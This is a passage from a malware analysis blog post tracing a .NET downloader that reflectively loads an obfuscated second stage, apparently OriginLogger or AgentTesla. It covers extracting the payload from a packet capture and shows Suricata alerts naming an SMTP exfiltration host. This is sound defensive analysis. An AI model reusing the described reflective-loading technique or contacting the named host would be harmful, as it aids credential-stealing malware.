</pre></table></code></div></div><p>This code sets a tag for the RichTextBox control to some code that performs a reflective load using the returned bytes. The <code class="language-plaintext highlighter-rouge">GetDomain().Load()</code> statement loads the returned bytes into memory. The loaded code doesn’t execute automatically, however, it needs to be invoked. To handle this, the <code class="language-plaintext highlighter-rouge">Lion()</code> and <code class="language-plaintext highlighter-rouge">Ursa()</code> functions invoke a function represented by the randomized string in the RichTextBox control. It invokes namespace <code class="language-plaintext highlighter-rouge">Gdbtshcw</code>, class <code class="language-plaintext highlighter-rouge">Sdnceyzqa</code>, and method <code class="language-plaintext highlighter-rouge">Vqyhbeqthicxedwtrnxrbzcq</code>. This randomized naming indicates stage 2 will likely have some decent obfuscation.</p><h2 id="getting-stage-2-from-pcap-and-deobfuscating"><span class="mr-2">Getting stage 2 from PCAP and deobfuscating</span><a href="#getting-stage-2-from-pcap-and-deobfuscating" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Luckily, Brad already captured the stage 2 download in his included PCAP so we don’t have to worry about trying to obtain it from the source ourselves. We can simply export it from the PCAP in Wireshark. To do so, we can open up Wireshark, open the PCAP, navigate to File &gt; Export Objects &gt; HTTP… and chose the <code class="language-plaintext highlighter-rouge">Ztvfo.png</code> file for export.</p><p><img data-src="/assets/images/net-downloader-originlogger/wireshark-http-export.png" alt="Exporting Ztvfo.png with Wireshark" data-proofer-ignore></p><p>Now that we’ve exported the obfuscated file, we can use CyberChef to deobfuscate the bytes.</p><p><img data-src="/assets/images/net-downloader-originlogger/cyberchef-deobfuscation.png" alt="Deobfuscating Ztvfo.png with CyberChef" data-proofer-ignore></p><p>Once deobfuscated, we can save the output to disk and go from there. Since stage 2 is pretty heavily obfuscated I think I’ll stop here for the night and try to tackle it in the future. Thank you for reading, and I hope you learned a little bit about .NET malware!</p><h2 id="how-do-we-know-its-originlogger-or-agenttesla"><span class="mr-2">How do we know it’s OriginLogger or AgentTesla?</span><a href="#how-do-we-know-its-originlogger-or-agenttesla" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>A since the first stage is generic and the second stage is heavily obfuscated, I leaned on using network traffic to identify more details about this sample. Using Suricata alongside ET OPEN some <a href="https://gist.github.com/jstrosch/317a03ad5cd9772685eb4f2020f4611e">special shell scripting from Josh Stroschein</a>, the network traffic generated these alerts:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/originlogger$</span><span class="w"> </span><span class="nb">sudo</span> ~/suri-ingest-pcap.sh 2023-01-05-Agent-Tesla-variant-traffic.pcap
<span class="gp">7/1/2023 -- 20:53:25 - &lt;Notice&gt;</span><span class="w"> </span>- This is Suricata version 6.0.8 RELEASE running <span class="k">in </span>USER mode
<span class="gp">7/1/2023 -- 20:53:49 - &lt;Notice&gt;</span><span class="w"> </span>- all 3 packet processing threads, 4 management threads initialized, engine started.
<span class="gp">7/1/2023 -- 20:53:49 - &lt;Notice&gt;</span><span class="w"> </span>- Signal Received.  Stopping engine.
<span class="gp">7/1/2023 -- 20:53:49 - &lt;Notice&gt;</span><span class="w"> </span>- Pcap-file module <span class="nb">read </span>1 files, 1049 packets, 902428 bytes
<span class="go">
[*] Alerts:

</span><span class="gp">"2023-01-05T17:51:30.494697-0500 | 1:2260002:1 | SURICATA Applayer Detect protocol only one direction | Generic Protocol Command Decode | 204.11.58.28:587 -&gt;</span><span class="w"> </span>192.168.1.27:51958<span class="s2">"
</span><span class="gp">"2023-01-05T17:51:00.081370-0500 | 1:2030171:1 | ET MALWARE AgentTesla Exfil Via SMTP | A Network Trojan was detected | 192.168.1.27:51958 -&gt;</span><span class="w"> </span><span class="s2">204.11.58.28:587"</span>
</pre></table></code></div></div><p>The ET MALWARE AgentTesla Exfil Via SMTP rule is was created for AgentTesla samples but there is some overlap between AgentTesla and OriginLogger as the latter is supposed to be <a href="https://unit42.paloaltonetworks.com/originlogger/">an updated fork</a> of the latter according to Unit42.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/originlogger/" class="post-tag no-text-decoration" >originlogger</a> <a href="/tags/csharp/" class="post-tag no-text-decoration" >csharp</a> <a href="/tags/iso/" class="post-tag no-text-decoration" >iso</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=.NET Downloader Leading to OriginLogger - Tony Lambert&amp;url=https://forensicitguy.github.io/net-downloader-originlogger/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=.NET Downloader Leading to OriginLogger - Tony Lambert&amp;u=https://forensicitguy.github.io/net-downloader-originlogger/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/net-downloader-originlogger/&amp;text=.NET Downloader Leading to OriginLogger - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/net-downloader-originlogger/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/formbook-via-vbs-powershell-and-csharp/"><div class="card-body"> <em class="timeago small" data-ts="1648166400" > 2022-03-25 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Formbook Distributed Via VBScript, PowerShell, and C# Code</h3><div class="text-muted small"><p> Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbo...</p></div></div></a></div><div class="card"> <a href="/how-qbot-uses-esentutl/"><div class="card-body"> <em class="timeago small" data-ts="1612137600" > 2021-02-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>How Qbot Uses Esentutl</h3><div class="text-muted small"><p> A colleague asked me a question today about the relationship between Qbot and a Windows system utility: esentutl.exe. It’s been sparsely documented via tweet, and I want to more fully explain why Q...</p></div></div></a></div><div class="card"> <a href="/analyzing-empire-macos-pkg-stager/"><div class="card-body"> <em class="timeago small" data-ts="1612742400" > 2021-02-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Analyzing an Empire macOS PKG Stager</h3><div class="text-muted small"><p> Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Em...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/malware-weight-loss-fast-foremost/" class="btn btn-outline-primary" prompt="Older"><p>Malware Weight Loss the Fast Way with Foremost</p></a> <a href="/batloader-ursnif-redline-oh-my/" class="btn btn-outline-primary" prompt="Newer"><p>BATLoader, Ursnif, and Redline, oh my!</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
